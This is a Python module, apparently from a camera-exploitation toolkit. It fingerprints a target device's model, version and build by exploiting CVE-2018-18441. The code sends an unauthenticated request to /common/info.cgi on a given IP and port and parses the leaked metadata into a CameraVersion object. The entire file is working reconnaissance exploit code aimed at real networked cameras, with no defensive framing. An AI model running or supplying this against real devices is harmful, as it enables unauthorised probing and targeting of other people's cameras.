import requests


class CameraVersion(object):
    """
    Class that outlines a cameras model, version, and build number.
    """
    def __init__(self, model, version, build):
        self._version = version
        self.model = model
        self.major_ver, self.minor_ver = version.split('.')
        self.build = build if build is not None else '0'

    def __str__(self):
        return '%s Ver: %s.%s.%s' % (self.model, self.major_ver,
                                     self.minor_ver, self.build)

    def __repr__(self):
        return 'CameraVersion(%s, %s, %s)' % \
               (self.model, self._version, self.build)


def get_camera_version(target_ip, target_port):
    """
    Retrieve the camera's version and model by exploiting CVE-2018-18441.

    :param target_ip: IP address of the target device.
    :type target_ip: str

    :param target_port: Listening port of the target device.
    :type target_port: str

    :return: Class representing the cameras version.
    :rtype: CameraVersion
    """
    try:
        response = requests.get('http://%s:%s/common/info.cgi' % (target_ip,
                                                                  target_port))
    except ConnectionError:
        raise Exception('%s:%s could not be reached.' % (target_ip,
                                                         target_port))

    response = response.content.decode('utf8')
    response = response.split('\r\n')
    metadata = {}

    for line in response:
        if '=' in line:
            key, value = line.split('=')
            metadata[key] = value

    model = metadata['model']
    version = metadata['version']
    build = metadata['build'] if 'build' in metadata else None

    return CameraVersion(model, version, build)
